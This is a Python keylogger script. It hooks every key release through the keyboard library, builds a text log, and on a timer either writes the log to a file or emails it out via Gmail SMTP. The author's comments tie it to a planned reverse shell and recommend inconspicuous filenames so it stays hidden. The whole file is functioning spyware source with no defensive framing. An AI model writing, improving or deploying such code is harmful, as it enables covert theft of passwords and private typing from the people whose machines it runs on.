import keyboard
import smtplib
from threading import Timer
from datetime import datetime

REPORT_TIMER = 60
EMAIL_ADDRESS = "some email@email.com"
EMAIL_PASS = "password of the email"


class KeyLogger:
    def __init__(self, listen_interval, report_method="email"):
        self.interval = listen_interval
        self.report_method = report_method
        self.log = ""
        # For recording start and end datetime

        self.start_date = datetime.now()
        self.end_date = datetime.now()

    def listen_keystrokes(self, event):
        # Here the callback happens when a key is released
        name = event.name
        if len(name) > 1:
            # This means that it's not a character since length of name is greater than 1
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[enter]"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name

    # Saving keylogs to a local file

    # Create the filename first
    def create_filename(self):
        start_date_str = str(self.start_date)[:-7].replace(" ", "-").replace(":", "")
        end_date_str = str(self.end_date)[:-7].replace(" ", "-").replace(":", "")

        # Try not to use name like keylog for obvious reason :)
        self.filename = f"keylog-{start_date_str}_{end_date_str}"

    def write_to_file(self):
        """ this creates a log file in current directory. this is only for testing purpose.
        before the final build this file will either stored in more safer location or this will be removed.
        The keylogs are stored self.log for now
        """
        with open(f"{self.filename}.txt", "a") as f:
            print(self.log, file=f)

    def send_email(self, email, password, message):
        # Configuring the email
        smtp_server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        smtp_server.starttls()
        smtp_server.login(email, password)
        smtp_server.sendmail(email, email, message)
        smtp_server.quit()

    # Here comes the fun part

    def send_keylogs(self):
        """
        This method is called once in every self.interval. Then sends the keylogs and resets the variable self.log.
        The transfer of data is not just limited to sending via emails. This KeyLogger class will be used in my
        another project which is a reverse shell. Now you can guess how i am planning the data transfer :)
        """
        if self.log:
            # Check if there's something in self.log
            self.end_date = datetime.now()

            # Create the filename
            self.create_filename()
            if self.report_method == "email":
                self.send_email(EMAIL_ADDRESS, EMAIL_PASS, self.log)
            elif self.report_method == "file":
                self.write_to_file()

            self.start_date = datetime.now()

        self.log = ""

        timer = Timer(interval=self.interval, function=self.send_keylogs)

        # Set the thread deamon. This dies when the main thread dies
        timer.daemon = True
        # Start the timer
        timer.start()

    # Start the keylogger

    def start_keylogger(self):
        # Set the starting datetime
        self.start_date = datetime.now()
        # Set the call back method on key release
        keyboard.on_release(callback=self.listen_keystrokes)
        # Send the keylogs
        self.send_keylogs()
        # Wait until ctrl-c is pressed
        keyboard.wait()


if __name__ == "__main__":
    Keylogger = KeyLogger(listen_interval=REPORT_TIMER, report_method="file")
    Keylogger.start_keylogger()

